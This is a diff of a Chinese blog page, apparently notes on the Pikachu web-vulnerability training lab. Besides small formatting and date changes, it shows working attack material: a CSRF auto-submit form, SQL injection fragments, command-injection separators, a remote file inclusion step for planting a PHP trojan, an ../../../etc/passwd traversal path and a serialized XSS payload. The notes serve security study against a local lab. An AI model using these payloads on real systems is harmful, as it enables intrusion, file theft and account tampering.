@@ -358,7 +358,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:
-                    2021-02-28
+                    2021-03-13
                 </div>
                 
 
@@ -618,39 +618,39 @@ payload2<span class="token operator">:</span>
 <h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>还是一样登录，修改信息，抓包。但这次修改信息是在一个POST表单里,不能直接改URL了</p>
 <p>查了一下发现一般可以自己搭一个站点，然后将POST请求隐藏在站点的表单里，当用户点击后数据就被POST到有CSRF漏洞的网站</p>
 <pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
- 
+
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
- 
+
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
- 
+
 window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
- 
+
 document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"postsubmit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
- 
+
 <span class="token punctuation">&#125;</span>
- 
+
 </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
- 
+
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
- 
+
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
- 
+
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>localhost/pikachu/vul/csrf/csrfpost/csrf_post_edit.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
- 
+
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>body<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
- 
+
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>123456789<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
- 
+
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>usa<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
- 
+
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>vince@pikachu.com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
- 
+
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>postsubmit<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
- 
+
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
- 
+
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
- 
+
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这个构造的网页也可以用CSRFTester抓包来生成</p>
@@ -761,23 +761,25 @@ kobe<span class="token string">' and if((substr(database(),1,1))='</span>p'<span
 <p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210214195819281.png"></p>
 <h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><blockquote>
 <ol>
-<li>字符、字符集<br>字符(character)是组成字符集(character set)的基本单位。对字符赋予一个数值(encoding)来确定这个字符在该字符集中的位置。</li>
-<li>UTF8<br>由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF(Universal Transformation Format)。</li>
-<li>宽字节<br>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。</li>
-</ol>
-<p>  <strong>MySQL字符集转换过程</strong></p>
-<ol>
-<li>MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection</li>
-<li>进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</li>
-</ol>
+<li><p>字符、字符集<br>字符(character)是组成字符集(character set)的基本单位。对字符赋予一个数值(encoding)来确定这个字符在该字符集中的位置。</p>
+</li>
+<li><p>UTF8<br>由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF(Universal Transformation Format)。</p>
+</li>
+<li><p>宽字节<br>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。</p>
+<p><strong>MySQL字符集转换过程</strong></p>
+</li>
+<li><p>MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection</p>
+</li>
+<li><p>进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</p>
 <ul>
 <li>使用每个数据字段的CHARACTER SET设定值</li>
 <li>若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)</li>
 <li>若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值</li>
 <li>若上述值不存在，则使用character_set_server设定值</li>
 </ul>
-<ol start="3">
-<li>将操作结果从内部操作字符集转换为character_set_results</li>
+</li>
+<li><p>将操作结果从内部操作字符集转换为character_set_results</p>
+</li>
 </ol>
 <p>宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码</p>
 <p><strong>宽字节注入原理</strong></p>
@@ -810,20 +812,29 @@ kobe<span class="token string">' and if((substr(database(),1,1))='</span>p'<span
 <p><strong>linuxL</strong>:<code>\</code></p>
 <h4 id="命令拼接符"><a href="#命令拼接符" class="headerlink" title="命令拼接符"></a>命令拼接符</h4><p><strong>windows</strong></p>
 <ol>
-<li><strong><code>“|”</code> 管道符，前面命令标准输出，后面命令的标准输入</strong></li>
-<li><strong><code>“&amp;”</code> commandA &amp; commandB 先运行命令A然后运行命令B</strong></li>
-<li><strong><code>“||”</code> commandA || commandB 运行命令A，如果失败则运行命令B</strong></li>
-<li><strong><code>“&amp;&amp;”</code> commandA &amp;&amp; commandB 运行命令A，如果成功则运行命令B</strong></li>
-</ol>
-<p> <strong>linux</strong></p>
-<ol>
-<li><strong><code>“|”</code> 管道符，前面命令标准输出，后面命令的标准输入</strong></li>
-<li><strong><code>“&amp;”</code> commandA &amp; commandB 先运行命令A然后运行命令B</strong></li>
-<li><strong><code>“||”</code> commandA || commandB 运行命令A，如果失败则运行命令B</strong></li>
-<li><strong><code>“&amp;&amp;”</code> commandA &amp;&amp; commandB 运行命令A，如果成功则运行命令B</strong></li>
-<li><strong><code>“;”</code> commandA;commandB执行完A执行B</strong></li>
-<li><strong><code>“%0a”</code> 换行符</strong></li>
-<li><strong><code>“%0d”</code> 回车符</strong></li>
+<li><p><strong><code>“|”</code> 管道符，前面命令标准输出，后面命令的标准输入</strong></p>
+</li>
+<li><p><strong><code>“&amp;”</code> commandA &amp; commandB 先运行命令A然后运行命令B</strong></p>
+</li>
+<li><p><strong><code>“||”</code> commandA || commandB 运行命令A，如果失败则运行命令B</strong></p>
+</li>
+<li><p><strong><code>“&amp;&amp;”</code> commandA &amp;&amp; commandB 运行命令A，如果成功则运行命令B</strong></p>
+<p><strong>linux</strong></p>
+</li>
+<li><p><strong><code>“|”</code> 管道符，前面命令标准输出，后面命令的标准输入</strong></p>
+</li>
+<li><p><strong><code>“&amp;”</code> commandA &amp; commandB 先运行命令A然后运行命令B</strong></p>
+</li>
+<li><p><strong><code>“||”</code> commandA || commandB 运行命令A，如果失败则运行命令B</strong></p>
+</li>
+<li><p><strong><code>“&amp;&amp;”</code> commandA &amp;&amp; commandB 运行命令A，如果成功则运行命令B</strong></p>
+</li>
+<li><p><strong><code>“;”</code> commandA;commandB执行完A执行B</strong></p>
+</li>
+<li><p><strong><code>“%0a”</code> 换行符</strong></p>
+</li>
+<li><p><strong><code>“%0d”</code> 回车符</strong></p>
+</li>
 </ol>
 <h4 id="执行函数"><a href="#执行函数" class="headerlink" title="执行函数"></a>执行函数</h4><p><strong>在PHP中，可以执行命令的函数有：</strong></p>
 <p><strong><code>system、exec、shell_exec、passthru、pcntl_exec、popen、proc_popen等</code></strong></p>
@@ -861,8 +872,6 @@ kobe<span class="token string">' and if((substr(database(),1,1))='</span>p'<span
 
 <pre class="line-numbers language-none"><code class="language-none">?filename&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;test&#x2F;yijuhua.txt
 访问它，执行php函数，生成一个php木马再连上去<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
 
 <h2 id="Unsafe-FileDownload（不安全文件下载）"><a href="#Unsafe-FileDownload（不安全文件下载）" class="headerlink" title="Unsafe FileDownload（不安全文件下载）"></a>Unsafe FileDownload（不安全文件下载）</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><blockquote>
 <p>文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。<br>此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。从而导致后台敏感信息(密码文件、源代码等)被下载。                     </p>
@@ -944,8 +953,6 @@ kobe<span class="token string">' and if((substr(database(),1,1))='</span>p'<span
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
 <h2 id="（目录遍历）"><a href="#（目录遍历）" class="headerlink" title="../../../（目录遍历）"></a>../../../（目录遍历）</h2><blockquote>
 <p>在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。  在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。  从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。</p>
 <p>看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。</p>
@@ -961,8 +968,6 @@ kobe<span class="token string">' and if((substr(database(),1,1))='</span>p'<span
 <span class="token comment">//    echo $html;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
 <h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><blockquote>
 <p>由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：<br>—通过访问url下的目录，可以直接列出目录下的文件列表;<br>—输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;<br>—前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;</p>
 </blockquote>
@@ -973,8 +978,6 @@ kobe<span class="token string">' and if((substr(database(),1,1))='</span>p'<span
 </blockquote>
 <p>随便序列化弹个框</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"S"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"&lt;script>alert('AAA')&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
 
 <h2 id="XXE（XML外部实体注入攻击）"><a href="#XXE（XML外部实体注入攻击）" class="headerlink" title="XXE（XML外部实体注入攻击）"></a>XXE（XML外部实体注入攻击）</h2><blockquote>
 <p>XXE -“xml external entity injection” 即”xml外部实体注入漏洞”。<br>概括一下就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”<br>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。<br>现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。<br>以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。</p>
@@ -1047,8 +1050,6 @@ HTML 旨在显示信息，而 XML 旨在传输信息。<span aria-hidden="true" 
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
 <h2 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h2><blockquote>
 <p>不安全的URL跳转问题可能发生在一切执行了URL地址跳转的地方。<br>如果后端采用了前端传进来的参数(可能是用户传参,或者之前预埋在前端页面的URL地址)作为了跳转的目的地,而又没有做判断的话就可能发生”跳错对象”的问题。</p>
 <p>URL跳转比较直接的危害是:–&gt;钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站</p>
@@ -1067,19 +1068,17 @@ HTML 旨在显示信息，而 XML 旨在传输信息。<span aria-hidden="true" 
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
 <h2 id="SSRF（服务端请求伪造）"><a href="#SSRF（服务端请求伪造）" class="headerlink" title="SSRF（服务端请求伪造）"></a>SSRF（服务端请求伪造）</h2><blockquote>
 <p>SSRF(Server-Side Request Forgery:服务器端请求伪造)，其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制</p>
 <p>导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</p>
 <p>数据流:攻击者—–&gt;服务器—-&gt;目标地址</p>
 <p>简单理解：服务器接受了客户端输入的URL，然后服务器端拿URL去请求并返回给你。</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">></span><span class="token constant">PHP</span>中下面函数的使用不当会导致<span class="token argument-name">SSRF</span><span class="token punctuation">:</span>
-<span class="token operator">></span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token operator">></span><span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token operator">></span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-   
-<span class="token operator">></span>如果一定要通过后台服务器远程去对用户指定<span class="token punctuation">(</span><span class="token string double-quoted-string">"或者预埋在前端的请求"</span><span class="token punctuation">)</span>的地址进行资源请求<span class="token punctuation">,</span>则请做好目标地址的过滤。 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PHP</span>中下面函数的使用不当会导致<span class="token argument-name">SSRF</span><span class="token punctuation">:</span>
+<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+如果一定要通过后台服务器远程去对用户指定<span class="token punctuation">(</span><span class="token string double-quoted-string">"或者预埋在前端的请求"</span><span class="token punctuation">)</span>的地址进行资源请求<span class="token punctuation">,</span>则请做好目标地址的过滤。 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 </blockquote>
 <h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><blockquote>
 <p>PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。</p>
@@ -1162,7 +1161,6 @@ HTML 旨在显示信息，而 XML 旨在传输信息。<span aria-hidden="true" 
     <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 
                 
             </div>
@@ -1545,7 +1543,7 @@ HTML 旨在显示信息，而 XML 旨在传输信息。<span aria-hidden="true" 
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">42.4k</span>&nbsp;字
+                class="white-color">42.5k</span>&nbsp;字
             
             
             
